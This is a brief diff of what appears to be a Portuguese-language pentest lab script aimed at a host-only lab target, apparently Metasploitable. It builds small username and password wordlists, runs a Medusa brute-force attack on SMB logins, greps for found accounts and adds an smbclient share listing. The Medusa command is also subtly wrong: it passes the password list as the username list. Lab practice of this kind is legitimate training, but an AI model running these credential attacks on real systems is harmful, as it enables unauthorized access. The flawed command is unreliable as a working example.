@@ -106,3 +106,4 @@ cat enum4_saida.txt | grep 'user:'
 echo -e "user\nmsfadmin\nservice" > usuarios_smb.txt
 echo -e "password\n123456\nWelcome123\nmsfadmin" > senhas_smb.txt
 medusa -h 192.168.56.102 -U senhas_smb.txt -P senhas_smb.txt -M smbnt -t 2 -T 50 | grep 'ACCOUNT FOUND'
+smbclient -L //192.168.56.102 -U msfadmin
